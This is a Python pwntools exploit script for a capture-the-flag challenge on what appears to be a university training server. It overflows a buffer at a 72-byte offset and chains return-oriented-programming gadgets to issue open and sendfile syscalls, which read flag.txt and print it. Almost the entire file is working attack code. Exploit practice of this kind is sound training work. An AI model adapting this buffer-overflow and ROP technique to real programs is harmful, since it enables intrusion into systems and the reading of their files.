from pwn import *

p = remote("cyberchallenge.disi.unitn.it", 50260)
# p = process("./bin")
# p = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     continue
#     """
# )

filename = b'flag.txt\x00'

pop_r10 = p64(0x000000000040119c) #pop r10; ret; 
pop_rdi = p64(0x0000000000401196) #pop rdi; ret; 
pop_rdx = p64(0x000000000040119a) #pop rdx; ret; 
pop_rsi = p64(0x0000000000401198) #pop rsi; ret;

flag_txt = 0x400000 + 0x00004020 # flag.txt location

syscall_open = p64(0x000000000040119f) # mov rax, 2; syscall;
syscall_sendfile = p64(0x00000000004011a9) # mov rax, 0x28; syscall; nop; pop rbp; ret;

offset = 72
payload = b'A' * offset

# open file
payload += pop_rdi
payload += p64(flag_txt)
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall_open

# sendfile
payload += pop_rdi
payload += p64(1) # stdout
payload += pop_rsi
payload += p64(6) # file descriptor
payload += pop_rdx
payload += p64(0)
payload += pop_r10
payload += p64(100)
payload += syscall_sendfile
payload += p64(0)


p.sendline(payload)
p.sendline(filename)
#p.interactive()
print(p.recvall(timeout=1).decode(errors="ignore").split("\n")[0])